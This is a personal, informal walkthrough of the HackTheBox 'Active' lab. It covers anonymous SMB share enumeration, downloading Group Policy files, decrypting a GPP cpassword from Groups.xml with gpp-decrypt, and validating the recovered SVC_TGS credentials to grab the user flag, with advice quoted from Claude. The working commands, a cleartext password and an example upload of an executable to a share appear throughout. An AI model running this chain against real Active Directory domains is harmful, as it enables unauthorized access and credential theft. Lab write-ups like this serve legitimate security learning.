this is a windows machine.


lets get crackin.

```
nmap $(cat ./IP) -sS -sV -oN nmap.txt
```

sweet. we need to find out how many SMB shares are on this.

`smbclient` ? probs.

time to edit `/etc/hosts` again. need to memorize this. `active.htb` == `cat ./IP`

```
smbclient active.htb
```

wait. just realized. I don't need to keep storing stuff in `./IP`, if I just edit /etc/hosts. lmao. dog darn it. 

ex:

```
└─$ smbclient '//10.129.6.180/new-site' -U 'tyler' --password '92g!mA8BGjOirkL%OG*&' -c 'put /home/henrypost/Downloads/handle.exe handle.exe'


smbclient 'active.htb' 
```

hm. okay. stuck. i'm going to ask z.ai for advice.

well. let's try claude, since i have 10 days left on my paid plan.

okay claude said a lot:

53=dns
88=kerberos
389/3268=ldap
445=smb
135=rpc

"classic AD box". cool.

"enum smb shares first, its easy lol" - k thx claude.

```
# Try anonymous/null session enumeration
smbclient -L //active.htb -N

# Or use smbmap
smbmap -H active.htb

# Or crackmapexec
crackmapexec smb active.htb --shares
```

kk. lets do it.

```

smbclient -L //active.htb -N

Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to active.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

sweet, i guess we can enum all these shares and see if they're null login able.

next one

```
smbmap -H active.htb

[+] IP: 10.129.13.147:445       Name: active.htb                Status: Authenticated                                                                             
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS

```

ok, mildly more useful, "Replication" has RO access, wew


tip frm claude:

If you find any accessible shares, you can browse them:

bash

```bash
smbclient //active.htb/SHARENAME -N
```

ok. so. i dont think claude knows that netexec is replacing crackmapexec. but w/e it doesnt matter
```
crackmapexec smb active.htb --shares
(session deleted???)

crackmapexec smb active.htb --share Replication
(not useful)
```
...
```
smbclient //active.htb/Replication -N

┌──(henrypost㉿kali-toughwolf)-[~/…/oscp/boxes/htb/Active]
└─$ smbclient //active.htb/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 05:37:44 2018
  ..                                  D        0  Sat Jul 21 05:37:44 2018
  active.htb                          D        0  Sat Jul 21 05:37:44 2018

                5217023 blocks of size 4096. 278953 blocks available
smb: \> dir active.htb
  active.htb                          D        0  Sat Jul 21 05:37:44 2018

                5217023 blocks of size 4096. 278953 blocks available
smb: \> dir ..
  .                                   D        0  Sat Jul 21 05:37:44 2018
  ..                                  D        0  Sat Jul 21 05:37:44 2018
  active.htb                          D        0  Sat Jul 21 05:37:44 2018

                5217023 blocks of size 4096. 278953 blocks available
smb: \> dir .
NT_STATUS_NO_SUCH_FILE listing \.
smb: \> 


(wtf do I do here? this seems possibly useful.)
```
okay. so. claude says I'm right where i want to be.

i can just download all the goodies.

```bash
smbget -R smb://active.htb/Replication -U '' -N #doesnt work lol
```

```bash
smbclient //active.htb/Replication -N -c 'prompt OFF;recurse ON;lcd /home/henrypost/Git/oscp/boxes/htb/Active/Replication;mget *'

# yeeeeep *BURRRRRP*

┌──(henrypost㉿kali-toughwolf)-[~/…/boxes/htb/Active/Replication]
└─$ smbclient //active.htb/Replication -N -c 'prompt OFF;recurse ON;lcd /home/henrypost/Git/oscp/boxes/htb/Active/Replication;mget *'
Anonymous login successful
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.3 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (7.0 KiloBytes/sec) (average 1.9 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1.3 KiloBytes/sec) (average 1.7 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (2.7 KiloBytes/sec) (average 1.9 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (9.4 KiloBytes/sec) (average 3.0 KiloBytes/sec)
                                                                                 
```
cool. data. wew.
what do with it?
okaaaay...claude...calm down gurl.

"""
PERFECT! You got it! Now look at that beautiful line:

```
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
```

**THAT'S THE GOLDEN TICKET!** 🎯
"""

good lord... linkedin slop posting esque. please chill.

golden ticket? what is this? some kerberos thing?
`cpassword` prop in xml. cool.

lets juhh.h....uh. just copy this to `./`...

`./goldenticketiguess.xml`

okay. cool.

```xml
<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>

edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

active.htb\SVC_TGS

# hm, i guess SVC_TGS is probably ticket granting service? wonder how to abuse.

gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

GPPstillStandingStrong2k18

cool. uh. what do.
```

"Now we need to figure out which user this password belongs to."

erm. `SVC_TGS`? lets see.

```bash
crackmapexec smb active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'

SMB         active.htb      445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         active.htb      445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 

(ok. but. wtf does this mean? the creds work? i think so.)
```

```bash
# **2. Enumerate shares with the valid creds:**

smbmap -H active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'

[+] IP: 10.129.13.147:445       Name: active.htb                Status: Authenticated                                                                             
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY

```

sick, nuts. got 4 shares RO access. time to keep digging.


lets use the last command that claude recommended.

```bash
smbclient //active.htb/Users    -U 'SVC_TGS%GPPstillStandingStrong2k18'
smbclient //active.htb/NETLOGON -U 'SVC_TGS%GPPstillStandingStrong2k18'
smbclient //active.htb/SYSVOL   -U 'SVC_TGS%GPPstillStandingStrong2k18'
smbclient //active.htb/Users    -U 'SVC_TGS%GPPstillStandingStrong2k18'
```


```
smb: \SVC_TGS\Desktop\> get user.txt
```
sweet. user flag pwned.


hm. well. going to ask claude what i should do next.
...or,

nah, screw AI. i could try to just uh. spider? how to spider smb? dunno. `hacktricks.xyz` to the rescue!

woof. exhausted. time to resume later.
